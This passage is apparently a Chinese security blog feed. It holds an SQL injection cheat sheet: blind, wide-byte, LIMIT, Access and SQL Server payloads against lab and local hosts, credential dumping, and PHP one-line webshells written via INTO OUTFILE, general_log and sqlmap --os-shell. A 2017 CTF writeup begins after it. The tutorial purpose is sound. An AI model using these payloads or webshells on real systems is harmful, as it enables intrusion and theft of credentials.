ord(MID(DATABASE(),1,1))=100 --+</span></span><br><span class="line"><span class="string">?id=1'</span> and ord(MID(DATABASE(),2,1))=118 --+</span><br></pre></td></tr></table></figure></p><p>regexp ：正则表达式 语法： regexp ^[a-z] 表示字符串中第一个字符是在 a-z范围内。 regexp ^a 表示字符串第一个字符是a。 regexp ^ab 表示字符串前两个字符是ab。</p><p>举例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and database() regexp '</span>^d<span class="string">' --+</span></span><br><span class="line"><span class="string">?id=1'</span> and database() regexp <span class="string">'^dv'</span> --+</span><br></pre></td></tr></table></figure></p><p>like：与正则表达式类似 语法： Like ‘%a’表示字符串第一个字符是a。 Like ‘%ab’表示字符串前两个字符是ab。</p><p>举例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and database() like '</span>d%<span class="string">' --+</span></span><br><span class="line"><span class="string">?id=1'</span> and database() like <span class="string">'dv%'</span> --+</span><br></pre></td></tr></table></figure></p><p>if()函数：判断函数，并根据判断结果返回特定值。<br>语法： if(判断条件,正确返回的值,错误返回的值)</p><p>举例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>()函数可以和前面提到的函数结合使用</span><br><span class="line">?id=1<span class="string">' and 1=if(前面提到的注入语句,1,0) --+</span></span><br><span class="line"><span class="string">?id=1'</span> and 1=<span class="keyword">if</span>(left(database(),1)=<span class="string">'d'</span>,1,0) --+</span><br><span class="line">?id=1<span class="string">' and 1=if(substr(database(),1,1)='</span>d<span class="string">',1,0) --+</span></span><br><span class="line"><span class="string">?id=1'</span> and 1=<span class="keyword">if</span>(ascii(substr(database(),1,1))=100,1,0) --+</span><br><span class="line">?id=1<span class="string">' and 1=if(MID(DATABASE(),1,1)='</span>d<span class="string">',1,0) --+</span></span><br><span class="line"><span class="string">?id=1'</span> and 1=<span class="keyword">if</span>(ord(MID(DATABASE(),1,1))=100,1,0) --+</span><br><span class="line">?id=1<span class="string">' and 1=if(database() regexp '</span>^d<span class="string">',1,0) --+</span></span><br><span class="line"><span class="string">?id=1'</span> and 1=<span class="keyword">if</span>(database() like <span class="string">'d%'</span>,1,0) --+</span><br></pre></td></tr></table></figure></p><h2 id="基于时间型盲住"><a href="#基于时间型盲住" class="headerlink" title="基于时间型盲住"></a>基于时间型盲住</h2><p>时间型盲注与布尔型盲注的语句构造过程类似，通常在布尔型盲注表达式的基础上使用IF语句加入延时语句来构造<br>如果 web 页面的返回值只有一种，true，无论输入任何值，它的返回都会按正确的来处理<br>时间型盲注语句<br>判断数据库长度</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">uname=a&amp;passwd=a<span class="string">") or if(length(database())=7, sleep(5),0) #</span></span><br><span class="line"><span class="string">uname=a&amp;passwd=a"</span>) or <span class="keyword">if</span>(length(database())=8, sleep(5),0) <span class="comment">#</span></span><br><span class="line">?id=1<span class="string">' and if(left(database(),1)='</span>s<span class="string">',sleep(3),0)--+</span></span><br><span class="line"><span class="string">?id=1'</span> and 1=<span class="keyword">if</span>(left(database(),1)=<span class="string">'d'</span>,sleep(3),0) --+</span><br><span class="line">?id=1<span class="string">' and 1=if(substr(database(),1,1)='</span>d<span class="string">',sleep(3),0) --+</span></span><br><span class="line"><span class="string">?id=1'</span> and 1=<span class="keyword">if</span>(ascii(substr(database(),1,1))=100,sleep(3),0) --+</span><br><span class="line">?id=1<span class="string">' and 1=if(MID(DATABASE(),1,1)='</span>d<span class="string">',sleep(3),0) --+</span></span><br><span class="line"><span class="string">?id=1'</span> and 1=<span class="keyword">if</span>(ord(MID(DATABASE(),1,1))=100,sleep(3),0) --+</span><br><span class="line">?id=1<span class="string">' and 1=if(database() regexp '</span>^d<span class="string">',sleep(3),0) --+</span></span><br><span class="line"><span class="string">?id=1'</span> and 1=<span class="keyword">if</span>(database() like <span class="string">'d%'</span>,sleep(3),0) --+</span><br></pre></td></tr></table></figure><p>已知 flag 表求 flag 字段<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">' and (select case when (select length(flag) from flag limit 1)=32 then sleep(5) else 1 end) and '</span>1<span class="string">'='</span>1</span><br><span class="line">?id=1<span class="string">' and (select case when (select ord(substring(flag from 1 for 1)) from flag limit 1) = 2 then sleep(5) else 1 end) and '</span>1<span class="string">'='</span>1</span><br><span class="line">?id=1<span class="string">' and exists(select flag from flag) and sleep(5) and '</span>1<span class="string">' = '</span>1</span><br></pre></td></tr></table></figure></p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>text/html; charset=gb2312 简体中文 判断是宽字节注入</p><h3 id="获取数据库名-3"><a href="#获取数据库名-3" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%bf<span class="string">' union select 1,2,database()%23</span></span><br></pre></td></tr></table></figure><h3 id="获取数据库中的表名-3"><a href="#获取数据库中的表名-3" class="headerlink" title="获取数据库中的表名"></a>获取数据库中的表名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%bf<span class="string">' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) %23</span></span><br></pre></td></tr></table></figure><h3 id="获取数据库中表的列"><a href="#获取数据库中表的列" class="headerlink" title="获取数据库中表的列"></a>获取数据库中表的列</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df%27 union select 1,group_concat(column_name),3 from information_schema.columns <span class="built_in">where</span> table_name=0x7361655F757365725F73716C6934%23</span><br></pre></td></tr></table></figure><h3 id="获取数据库表中列字段的值-2"><a href="#获取数据库表中列字段的值-2" class="headerlink" title="获取数据库表中列字段的值"></a>获取数据库表中列字段的值</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df%27 union select 1,group_concat(id,0x7e,title_1,0x7e,content_1),3 from mydbs.sae_user_sqli4 %23</span><br></pre></td></tr></table></figure><h2 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h2><p>发现回显会多一个”,1”，并且”1”由 num 参数控制。并且不加 num 参数不提供报错，由此想到 limit 注入。<br>limit 1,1 procedure analyse (extractvalue(rand(),concat(0x3a,SQL注入代码)),1)</p><p>语法：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br></pre></td></tr></table></figure></p><h3 id="获取数据库表"><a href="#获取数据库表" class="headerlink" title="获取数据库表"></a>获取数据库表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0 procedure analyse (extractvalue(rand(),concat(0x3a,(select database()))),1)%23&amp;num=1</span><br></pre></td></tr></table></figure><h3 id="获取数据库表中的列"><a href="#获取数据库表中的列" class="headerlink" title="获取数据库表中的列"></a>获取数据库表中的列</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0 procedure analyse (extractvalue(rand(),concat(0x3a,(select group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database()))),1)%23&amp;num=1</span><br></pre></td></tr></table></figure><h3 id="获取数据库表中列字段的值-3"><a href="#获取数据库表中列字段的值-3" class="headerlink" title="获取数据库表中列字段的值"></a>获取数据库表中列字段的值</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0 procedure analyse (extractvalue(rand(),concat(0x3a,(select group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=0x75736572))),1)%23&amp;num=1</span><br><span class="line">或者http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0 procedure analyse (extractvalue(rand(),concat(0x3a,(select concat(username,0x3a,password) from user <span class="built_in">limit</span> 2,1))),1)%23&amp;num=1</span><br></pre></td></tr></table></figure><h2 id="基于约束的-SQL-攻击"><a href="#基于约束的-SQL-攻击" class="headerlink" title="基于约束的 SQL 攻击"></a>基于约束的 SQL 攻击</h2><p>也就是二次注入的原理<br>因为 sql 的 select 是不忽视最大长度的限制的<br>而 insert 是有最大长度的限制的，超过长度限制就会发生截断。所以可以利用 insert 插入一个任意用户名加（N个空格，一般64个）然后用 select 选择出来，select 默认是选择第一条数据，所以存在一个任意用户登录的漏洞</p><h2 id="access手工注入"><a href="#access手工注入" class="headerlink" title="access手工注入"></a>access手工注入</h2><h3 id="判断是否注入点"><a href="#判断是否注入点" class="headerlink" title="判断是否注入点"></a>判断是否注入点</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入 http://192.168.1.7:800/shownews.asp?id=178 and 1=1 网页正常</span><br></pre></td></tr></table></figure><p><img src="7_1.jpeg" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入 http://192.168.1.7:800/shownews.asp?id=178 and 1=2 网页不正常</span><br></pre></td></tr></table></figure><p><img src="7_2.jpeg" alt></p><h3 id="猜解表-access-只能通过猜测获得表和字段"><a href="#猜解表-access-只能通过猜测获得表和字段" class="headerlink" title="猜解表  access 只能通过猜测获得表和字段"></a>猜解表  access 只能通过猜测获得表和字段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.7:800/shownews.asp?id=178 and exists (select * from admin)  页面正常</span><br></pre></td></tr></table></figure><p>说明存在 admin 这个表</p><p><img src="7_3.jpeg" alt></p><h3 id="猜解列"><a href="#猜解列" class="headerlink" title="猜解列"></a>猜解列</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入http://192.168.1.7:800/shownews.asp?id=178 and exists (select username from admin)  网页正常</span><br></pre></td></tr></table></figure><p>说明存在 username 这个列</p><p><img src="7_3.jpeg" alt></p><h3 id="通过-order-by-判断长度"><a href="#通过-order-by-判断长度" class="headerlink" title="通过 order by 判断长度"></a>通过 order by 判断长度</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入http://192.168.1.7:800/shownews.asp?id=178 order by 10 网页正常，说明大于等于10</span><br></pre></td></tr></table></figure><p><img src="7_4.jpeg" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入http://192.168.1.7:800/shownews.asp?id=178 order by 11 网页不正常，</span><br><span class="line">说明小于11所以应该为10</span><br></pre></td></tr></table></figure><p><img src="7_5.jpeg" alt></p><h3 id="Union查询-查显错点"><a href="#Union查询-查显错点" class="headerlink" title="Union查询  查显错点"></a>Union查询  查显错点</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入http://192.168.1.7:800/shownews.asp?id=178 and 1=2 union select 1,2,3,4,5,6,7,8,9,10 from admin</span><br></pre></td></tr></table></figure><p><img src="7_6.jpeg" alt></p><h3 id="爆出-admin-表的数据"><a href="#爆出-admin-表的数据" class="headerlink" title="爆出 admin 表的数据"></a>爆出 admin 表的数据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入http://192.168.1.7:800/shownews.asp?id=178 and 1=2 union select 1,username,3,4,5,6,7,8,9,10 from admin</span><br></pre></td></tr></table></figure><p><img src="7_7.jpeg" alt></p><h3 id="用同样的方法步骤可以得出-password-表的数据"><a href="#用同样的方法步骤可以得出-password-表的数据" class="headerlink" title="用同样的方法步骤可以得出 password 表的数据"></a>用同样的方法步骤可以得出 password 表的数据</h3><h2 id="sqlserver-手工注入"><a href="#sqlserver-手工注入" class="headerlink" title="sqlserver 手工注入"></a>sqlserver 手工注入</h2><h3 id="获取当前数据库"><a href="#获取当前数据库" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.108:800/eims_cms_3.5/News.asp?SortID=1&amp;ItemID=49 and db_name()&gt;0;--</span><br></pre></td></tr></table></figure><h3 id="获取第一个表"><a href="#获取第一个表" class="headerlink" title="获取第一个表"></a>获取第一个表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.108:800/eims_cms_3.5/News.asp?SortID=1&amp;ItemID=49 and 0&lt;(select top 1 name from Test_EIMS.dbo.sysobjects <span class="built_in">where</span> xtype=0x75);--</span><br></pre></td></tr></table></figure><p>得到第一个表 eims_CasePro</p><h3 id="通过已得到的表获取其他的表"><a href="#通过已得到的表获取其他的表" class="headerlink" title="通过已得到的表获取其他的表"></a>通过已得到的表获取其他的表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.108:800/eims_cms_3.5/News.asp?SortID=1&amp;ItemID=49 and 0&lt;(select top 1 name from Test_EIMS.dbo.sysobjects <span class="built_in">where</span> xtype=0x75 and name not <span class="keyword">in</span>(<span class="string">'eims_CasePro'</span>));--</span><br></pre></td></tr></table></figure><p>得到表eims_CaseSort</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.108:800/eims_cms_3.5/News.asp?SortID=1&amp;ItemID=49 and 0&lt;(select top 1 name from Test_EIMS.dbo.sysobjects <span class="built_in">where</span> xtype=0x75 and name not <span class="keyword">in</span> (<span class="string">'eims_CasePro'</span>,<span class="string">'eims_CaseSort'</span>));--</span><br></pre></td></tr></table></figure><p>得到表 eims_Down  其他表的获得方式一样</p><h3 id="获取列"><a href="#获取列" class="headerlink" title="获取列"></a>获取列</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.108:800/eims_cms_3.5/News.asp?SortID=1&amp;ItemID=49 and 0&lt;(select top 1 name from Test_EIMS.dbo.syscolumns <span class="built_in">where</span> id=(select id from Test_EIMS.dbo.sysobjects <span class="built_in">where</span> xtype=<span class="string">'U'</span> and name=<span class="string">'eims_User'</span>));--</span><br></pre></td></tr></table></figure><p>得到列 ItemID</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.108:800/eims_cms_3.5/News.asp?SortID=1&amp;ItemID=49 and 0&lt;(select top 1 name from Test_EIMS.dbo.syscolumns <span class="built_in">where</span> id=(select id from Test_EIMS.dbo.sysobjects <span class="built_in">where</span> xtype=<span class="string">'U'</span> and name=<span class="string">'eims_User'</span>) and name not <span class="keyword">in</span> (<span class="string">'ItemID'</span>));--</span><br></pre></td></tr></table></figure><p>得到列 SortID</p><h3 id="获取值"><a href="#获取值" class="headerlink" title="获取值"></a>获取值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.108:800/eims_cms_3.5/News.asp?SortID=1&amp;ItemID=49and 1&lt;(select top 1 admin_name%2b&apos;:&apos;%2badmin_pass from Test_EIMS.dbo.admin_User);--</span><br></pre></td></tr></table></figure><p>得到值admin:admin</p><h2 id="mysql-写入木马"><a href="#mysql-写入木马" class="headerlink" title="mysql 写入木马"></a>mysql 写入木马</h2><h3 id="取得注入漏洞，手工注入一句话木马"><a href="#取得注入漏洞，手工注入一句话木马" class="headerlink" title="取得注入漏洞，手工注入一句话木马"></a>取得注入漏洞，手工注入一句话木马</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.108/510cms/510cms/news.php?cid=&amp;listid=&amp;newsid=33 and 1=2 union select 1,2,<span class="string">'&lt;?php eval([$_POST[1])?&gt;'</span>,4 into outfile <span class="string">'c:\\wwwroot\\510cms\\510cms\\admin\\zks.php'</span></span><br></pre></td></tr></table></figure><h3 id="穿山甲利用filewriter写入"><a href="#穿山甲利用filewriter写入" class="headerlink" title="穿山甲利用filewriter写入"></a>穿山甲利用filewriter写入</h3><p><img src="9_1.jpeg" alt></p><h3 id="sqlmap-生成注入点-–os-shell"><a href="#sqlmap-生成注入点-–os-shell" class="headerlink" title="sqlmap 生成注入点  –os-shell"></a>sqlmap 生成注入点  –os-shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap. -u <span class="string">"http://192.168.1.108/510cms/510cms/news.php?cid=&amp;listid=&amp;newsid=24"</span> --os-shell</span><br></pre></td></tr></table></figure><p><img src="9_2.jpeg" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">生成上传点：http://192.168.1.108:80/510cms/tmpuxsbx.php</span><br></pre></td></tr></table></figure><p><img src="9_3.jpeg" alt></p><p>上传 php 一句话木马连接菜刀 </p><h2 id="拿到-phpmysdmin-后台后如何拿到w-ebshell"><a href="#拿到-phpmysdmin-后台后如何拿到w-ebshell" class="headerlink" title="拿到 phpmysdmin 后台后如何拿到w ebshell"></a>拿到 phpmysdmin 后台后如何拿到w ebshell</h2><h3 id="在-my-ini-或者-mysql-cnf-对文件导入导出进行限制"><a href="#在-my-ini-或者-mysql-cnf-对文件导入导出进行限制" class="headerlink" title="在 my.ini 或者 mysql.cnf 对文件导入导出进行限制"></a>在 my.ini 或者 mysql.cnf 对文件导入导出进行限制</h3><h4 id="限制-mysqld-不允许导入-导出"><a href="#限制-mysqld-不允许导入-导出" class="headerlink" title="限制 mysqld 不允许导入 | 导出"></a>限制 mysqld 不允许导入 | 导出</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqld --secure_file_prive=null</span><br></pre></td></tr></table></figure><h4 id="限制-mysqld-的导入-导出-只能发生在-tmp-目录下"><a href="#限制-mysqld-的导入-导出-只能发生在-tmp-目录下" class="headerlink" title="限制 mysqld 的导入 | 导出 只能发生在 /tmp/ 目录下"></a>限制 mysqld 的导入 | 导出 只能发生在 /tmp/ 目录下</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqld --secure_file_priv=<span class="string">"/tmp/"</span></span><br></pre></td></tr></table></figure><h4 id="不对-mysqld-的导入-导出做限制"><a href="#不对-mysqld-的导入-导出做限制" class="headerlink" title="不对 mysqld 的导入 | 导出做限制"></a>不对 mysqld 的导入 | 导出做限制</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqld --secure_file_priv=<span class="string">"/"</span></span><br></pre></td></tr></table></figure><h3 id="不对-mysqld-的导入-导出做限制直接写入一句话"><a href="#不对-mysqld-的导入-导出做限制直接写入一句话" class="headerlink" title="不对 mysqld 的导入 | 导出做限制直接写入一句话"></a>不对 mysqld 的导入 | 导出做限制直接写入一句话</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">'&lt;php eval($_POST[1]);?&gt;'</span> into outfile <span class="string">'/tmp/html/www/1.php'</span>;</span><br></pre></td></tr></table></figure><h3 id="对-mysqld-的导入-导出做限制"><a href="#对-mysqld-的导入-导出做限制" class="headerlink" title="对 mysqld 的导入 | 导出做限制"></a>对 mysqld 的导入 | 导出做限制</h3><h4 id="先查看-secure-file-priv-设置的路径"><a href="#先查看-secure-file-priv-设置的路径" class="headerlink" title="先查看 secure_file_priv 设置的路径"></a>先查看 secure_file_priv 设置的路径</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@global.secure_file_priv;</span><br><span class="line">SHOW VARIABLES LIKE <span class="string">"secure_file_priv"</span></span><br></pre></td></tr></table></figure><h4 id="修改-secure-file-priv-设置的路径"><a href="#修改-secure-file-priv-设置的路径" class="headerlink" title="修改 secure_file_priv 设置的路径"></a>修改 secure_file_priv 设置的路径</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> global secure_file_priv=<span class="string">'C:/php/WWW/'</span>;</span><br></pre></td></tr></table></figure><h4 id="查看-general-log-file-的路径并修改至网站根目录"><a href="#查看-general-log-file-的路径并修改至网站根目录" class="headerlink" title="查看 general_log_file 的路径并修改至网站根目录"></a>查看 general_log_file 的路径并修改至网站根目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE <span class="string">"%general%"</span></span><br><span class="line">SET global general_log_file=<span class="string">'C:/php/WWW/1.php'</span></span><br><span class="line"><span class="built_in">set</span> global general_log=<span class="string">'on'</span></span><br></pre></td></tr></table></figure><h4 id="写入一句话木马"><a href="#写入一句话木马" class="headerlink" title="写入一句话木马"></a>写入一句话木马</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">'&lt;?php @eval($_POST[3123]);?&gt;'</span></span><br></pre></td></tr></table></figure><h4 id="菜刀连接-1-php-即可"><a href="#菜刀连接-1-php-即可" class="headerlink" title="菜刀连接 1.php 即可"></a>菜刀连接 1.php 即可</h4><h3 id="查看mysql关键路径"><a href="#查看mysql关键路径" class="headerlink" title="查看mysql关键路径"></a>查看mysql关键路径</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show grants <span class="keyword">for</span> <span class="string">''</span>@<span class="string">'%'</span>;  查看 mysql 用户的权限</span><br><span class="line">select @@datadir;      查询读取数据库路径</span><br><span class="line">select @@basedir;      查询 MYSQL 安装路径</span><br></pre></td></tr></table></figure><h2 id="sql-注入防护"><a href="#sql-注入防护" class="headerlink" title="sql 注入防护"></a>sql 注入防护</h2><p>0）、采用 sql 语句预编译和绑定变量，是防御 sql 注入的最佳方法<br>1）、mysql_real_escape_string() 函数来转义特殊的输入字符<br>2）、addcslashes() 函数在指定的字符前添加反斜杠</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2017湖湘杯</title>
      <link href="/2017/12/15/2017%E6%B9%96%E6%B9%98%E6%9D%AF/"/>
      <url>/2017/12/15/2017%E6%B9%96%E6%B9%98%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<p>2017湖湘杯网络安全大赛Writeup</p><a id="more"></a><p>复赛为web渗透，反编译，破解，加密&amp;解密 一共15道题。</p><h1 id="Misc100-热身运动"><a href="#Misc100-热身运动" class="headerlink" title="Misc100 热身运动"></a>Misc100 热身运动</h1><p>64 个棋盘格子，每一帧都有不同的头像在一个格子里面，想到六十四进制和 Base64 编码。<br>将头像的格子换成数字，再对应 Base64 编码，最后解密得到 flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">25,38,49,33,25,55,44,49,29,5,60,49,13,21,61,38,29,22,57,46,30,23,52</span><br><span class="line">ZmxhZ3sxdF8xNV9mdW5ueX0=</span><br><span class="line">flag&#123;1t_15_funny&#125;</span><br></pre></td></tr></table></figure><h1 id="Misc150-流量分析"><a href="#Misc150-流量分析" class="headerlink" title="Misc150 流量分析"></a>Misc150 流量分析</h1><p>WireShark 打开 pcap 直接导出 flag.zip 打开后是 ce.txt</p><p><img src="misc150.png" alt></p><p>是 RGB 值，写脚本解出 flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">x = 887 </span><br><span class="line">y = 111 </span><br><span class="line">im = Image.new(<span class="string">'RGB'</span>,(x,y))</span><br><span class="line"></span><br><span class="line"><span class="comment">#rgb1 = [****]</span></span><br><span class="line">m=0</span><br><span class="line">file = open(<span class="string">'ce.txt'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(0,x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(0,y):</span><br><span class="line"></span><br><span class="line">        <span class="comment">#line = rgb1[(3*m):(3*(m+1))]</span></span><br><span class="line">        m+=1</span><br><span class="line">        rgb = c = file.readline().split(<span class="string">","</span>)</span><br><span class="line">        im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))</span><br><span class="line"></span><br><span class="line">im.show()</span><br><span class="line">im.save(<span class="string">"flag.png"</span>)</span><br></pre></td></tr></table></figure><p><img src="misc150-flag.png" alt></p><h1 id="Misc200-Encryptor-apk"><a href="#Misc200-Encryptor-apk" class="headerlink" title="Misc200 Encryptor.apk"></a>Misc200 Encryptor.apk</h1><p>分析定位到 EncryptImageActivity 类，可以看到加密函数。</p><p><img src="misc200.png" alt></p><p>异或加密，在重复操作，就是把 flag 丢进去再加密一次，拉出结果文件。</p><p>根据这个将加密后的文件进行解密就可以，还有就是那个 key 是字符 Password 的 md5<br>例如 bash d56a23，key 就是 bash key=[0xd5,0x6a,0x23] 这样分割。</p><p><img src="misc200-flag.png" alt></p><h1 id="Misc300"><a href="#Misc300" class="headerlink" title="Misc300"></a>Misc300</h1><p><a href="https://github.com/ctfs/write-ups-2016/tree/master/pragyan-ctf-2016/steganography/who-made-me-100" target="_blank" rel="noopener">原题</a></p><h1 id="RE100-Re4newer"><a href="#RE100-Re4newer" class="headerlink" title="RE100 Re4newer"></a>RE100 Re4newer</h1><p>查壳发现有 UPX upx -d 文件名<br>脱掉之后 IDA 分析定位主函数进行逆向，sub_401080</p><p><img src="RE100_1.png" alt></p><p><img src="RE100_2.png" alt></p><p>可以看到，这里可以分成44个两位16进制的数，并且顺序与箭头所指的数的大小有关。</p><p>pyhon脚本如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = [0x45,0x43,0x4E,0x44,0x13,0x4A,0x76,0x59,0x71,0x4B,0x7D,0x51,0x54,0x7D,0x63,0x7D,0x7D,0x5B,0x50,0x11,0x52,0x4F,0x4B,0x51,0x70,0x7D,0x47,0x4E,0x67,0x67,0x70,0x70,0x7D,0x57,0x7D,0x67,0x71,0x51,0x63,0x52,0x5F,0x56,0x13,0x7D]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(11):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> [3,2,1,0]: </span><br><span class="line">       flag += chr( a[i*4+j]^0x22)</span><br><span class="line"><span 